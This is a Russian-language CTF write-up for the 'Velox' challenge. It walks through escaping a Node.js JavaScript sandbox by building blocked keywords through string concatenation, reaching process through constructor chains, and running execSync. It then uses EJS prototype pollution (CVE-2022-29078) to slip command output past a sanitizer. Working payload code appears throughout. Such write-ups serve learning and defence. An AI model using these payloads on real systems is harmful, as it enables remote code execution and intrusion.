# Velox — райтап

Это не справочник, а рассказ о том, как я дошёл до флага: что попробовал, что не сработало, о чём подумал в этот момент и куда пошёл дальше.

---

## Шаг 0. Открываю сайт

Дают ссылку на `http://target:3000/`. Открываю — лендинг «Velox», «облачная платформа для трансформации данных через пользовательский JavaScript». Кнопки: войти, зарегистрироваться.

Первая мысль простая: **раз сервис выполняет пользовательский JS на сервере — это sandbox escape**. Вся задача, скорее всего, сводится к тому, чтобы выбраться из этого «песка» и что-то прочитать на файловой системе. Пока не знаю что и как — иду смотреть.

Регистрируюсь. Тут первый сюрприз: форма не отправляется, пока не решишь Proof-of-Work (hashcash) и не пройдёшь какую-то «проверку браузера». Беру настоящий браузер, включаю JS — проходит. На `curl`/скрипт это бы споткнулось, но я человек, мне пофиг. Захожу под аккаунтом.

---

## Шаг 1. Осматриваюсь в дашборде

Внутри три вкладки:

- **Transforms** — создать и запустить JS-трансформ.
- **Data Sources** — загрузка файлов.
- **Settings** — профиль, email, пароль.

Сразу пытаюсь понять, где живёт уязвимость. Логика подсказывает: единственное место, где **мой код выполняется на сервере** — это Transforms. Остальное (загрузки, профиль) — это, скорее всего, декорации, чтобы отвлечь. Но я их не выбрасываю, а откладываю на потом — если основной путь зайдёт в тупик, вернусь и проверю их.

Создаю трансформ → открывается редактор с двумя полями: `input_json` (входные данные) и `code` (собственно JS). Отправка идёт на `POST /transforms/{id}/run`, результат показывается в блоке «Output».

## Шаг 2. Прощупываю sandbox

Сначала банальное: пишу `1+1` → получаю `2`. Работает.

Теперь мне нужно понять, **что у меня есть внутри**. Пишу:

```js
Object.keys(this).join(',')
```

Получаю:
```
input,Math,parseInt,parseFloat,isNaN,isFinite,undefined,NaN,Infinity,encodeURIComponent,decodeURIComponent
```

И тут ключевой момент. Я ожидал увидеть `Object`, `String`, `Array`, `JSON` — стандартные глобалы. **Их нет.** Авторы намеренно вычистили всё, кроме `input` (мои данные) и пары математических утилит.

О чём это говорит? Они знают, что sandbox слабый, и пытаются усложнить жизнь. Значит, классический путь `process.mainModule.require(...)` я просто так не напишу — нет ни `process`, ни `require`. Нужно сначала **добраться до хостовых объектов**.

---

## Шаг 3. Натыкаюсь на фильтр ключевых слов

Пробую:

```js
typeof process
```

Получаю: `Expression contains restricted syntax`.

Ага, **фильтр**. Проверяю, что ещё запрещено: `require`, `constructor`, `prototype`, `Function`, `eval`, `global`, `globalThis`, `mainModule`, `execSync`, `spawnSync`, `exec`, `spawn`, `__proto__` — всё блокируется. Unicode- и hex-эскейпы тоже.

Делаю вывод: фильтр — это **регулярка по исходному коду**, ищет слова целиком (`\b...\b`) плюс `__proto__`. Это важно, потому что regex смотрит на **текст**, а не на то, как JS его вычислит. Если я смогу собрать запрещённое слово **из кусочков в рантайме** — regex его не увидит.

---

## Шаг 4. Обхожу фильтр конкатенацией

Пробую собрать `constructor` из двух строк:

```js
var a="con"; var b="structor";
input[a+b]
```

Не блокируется. И возвращает мне `Object` — потому что `input` это объект, и у него есть прототипная цепочка: `input.constructor` → хостовый `Object`.

**Это и есть первый настоящий прорыв.** Через `input.constructor` я дотягиваюсь до хостовых объектов, несмотря на то, что `Object` не лежит в глобалах, а слово `constructor` заблокировано. Конкатенация обманула regex, а прототипная цепочка обманула отсутствие глобалов.

Отсюда логичный следующий шаг: `input.constructor.constructor` — это уже хостовый `Function`. А `Function("return process")()` — это классический способ достать `process` из любой точки JS.

## Шаг 5. Достаю process — и упираюсь в пустой FLAG

Собираю:

```js
var a="con"; var b="structor";
var F = parseInt[a+b];              // parseInt.constructor → Function
var p = F("return pro"+"cess")();   // Function("return process")() → process
p.env.FLAG
```

Возвращается пустая строка.

Сначала думаю — может, переменная называется иначе. Перебираю `env`, смотрю ключи — нет. **Флага в окружении нет.** Авторы его оттуда вычистили.

Окей, значит флаг не в env. Тогда где? Логичный вывод: **где-то в файловой системе**, и его надо прочитать. Стандартный CTF-приём — файл `/flag` с правами `0400 root:root` и SUID-хелпер, который его читает. Проверяю гипотезу: пытаюсь вызвать `child_process.execSync('/usr/local/bin/readflag')` (тоже через конкатенацию, чтобы обойти фильтр).

---

## Шаг 6. Вызываю readflag — и упираюсь в output sanitizer

Пишу:

```js
var a="con"; var b="structor";
var F = parseInt[a+b];
var p = F("return pro"+"cess")();
p["main"+"Module"]["re"+"quire"]("child_"+"pro"+"cess")["exe"+"cSy"+"nc"]("/usr/local/bin/readflag").toString()
```

И получаю: `[output filtered — restricted content detected]`.

**Новый сюрприз:** авторы повесили **санитайзер на выходе**. Он проверяет то, что возвращает мой код, и режет всё, что похоже на флаг — прямой текст, перевёрнутую строку, hex, charcode-массивы. Я даже Цезаря +1 попробовал — режет. Они проверяют все 256 сдвигов.

Тут я сажусь и думаю. Прямой возврат из sandbox **вообще не работает** — что бы я ни вернул, если там есть флаг, его обрежут. Значит, **нужен side-channel** — способ вывести флаг куда-то мимо блока Output.

---

## Шаг 7. Ключевой инсайт: флаг должен попасть в HTML, а не в Output

Я знаю, что результат рендерится через EJS (видно по структуре страниц и по тому, что в `package.json`/ошибкам торчит `ejs 3.1.6`). И тут в голове всплывает **CVE-2022-29078** — уязвимость EJS через `outputFunctionName`.

Суть CVE: когда EJS компилирует шаблон, он генерирует строку вида

```js
var <outputFunctionName> = '';
```

и потом в неё накапливает вывод. Если атакующий может **заполнуть `Object.prototype.outputFunctionName`**, он подставляет туда произвольный JS — и тот выполнится при рендере. И самое главное: результат попадает **в HTML страницы**, а не в блок Output. А санитайзер проверяет только блок Output. Значит, флаг пройдёт через рендер и окажется в исходном коде страницы.

Это и есть ключевой переход: я перестаю пытаться **вернуть** флаг из sandbox и начинаю **заполнять прототип**, чтобы флаг вывелся сам при следующем рендере.

## Шаг 8. Собираю payload

Сначала получаю `Object.prototype` хоста (через ту же конкатенацию):

```js
var a="con"; var b="structor"; var c="pro"; var d="totype";
var proto = input[a+b][c+d];   // Object.prototype
```

Теперь надо понять, **какую строку** положить в `outputFunctionName`, чтобы EJS её корректно «вставил» и при этом выполнился мой код. EJS подставит значение как имя функции:

```js
var <МОЯ_СТРОКА> = '';
```

Значит, мне нужно закрыть это объявление (`_tmp;`), выполнить свой код, дописать результат в `__output` (переменная накопления EJS), и открыть новое валидное объявление (`var _tmp2`), чтобы синтаксис не сломался.

Собираю:

```js
proto.outputFunctionName =
  '_tmp;try{__output+='
  + 'process' + '.'
  + 'mainModule' + '.'
  + 'require' + "('" + 'child_process' + "')['"
  + 'execSync' + "']('" + '/usr/local/bin/readflag' + "').toString()}"
  + 'catch(e){};var _tmp2';
```

(все опасные слова собраны конкатенацией, чтобы обойти regex-фильтр.)

Возвращаю из sandbox пустую строку `""`, чтобы санитайзер был доволен.

Вставляю payload в поле «Code», в `input_json` кладу `{}`, жму Run.

В блоке Output — пусто (как и задумано). **Но я открываю View Source страницы** — и там, в HTML, лежит флаг:

```

```

Готово.

## Как я рассуждал по пути — кратко

1. **«Юзерский JS на сервере»** → значит, цель — sandbox escape.
2. **Вычищенные глобалы** → авторы знают про слабость sandbox, придётся лезть через прототипную цепочку.
3. **Фильтр ключевых слов по regex** → обхожу конкатенацией строк в рантайме.
4. **`input.constructor` даёт хостовый `Object`** → первый настоящий прорыв, дотягиваюсь до хоста.
5. **`process.env.FLAG` пуст** → флаг не в окружении, значит в файле.
6. **`readflag` обрезается санитайзером** → прямой возврат не работает, нужен side-channel.
7. **EJS 3.1.6 + CVE-2022-29078** → заполляю `Object.prototype.outputFunctionName`, флаг уходит в HTML мимо санитайзера.
8. **View Source** → флаг.

## Цепочка одной строкой

```
конкатенация строк (обход regex) → vm sandbox escape через input.constructor
  → Object.prototype pollution → EJS outputFunctionName (CVE-2022-29078)
  → RCE при рендере → /usr/local/bin/readflag (SUID) → флаг в HTML
```

## Ложные следы, на которые я не повёлся

- **Data Sources / загрузка файлов** — проверил, защищено: случайное имя файла, whitelist MIME, path traversal нет. Декорация.
- **Settings / смена профиля** — CSRF, bcrypt, XSS нет. Декорация.
- **`process.env.FLAG`** — пусто, env зачищен.
- **Прямой возврат флага из sandbox** — режется санитайзером во всех кодировках.
- **Unicode/hex эскейпы** — заблокированы фильтром.

Всё это авторы положили, чтобы увести в сторону. Реальный путь — один.
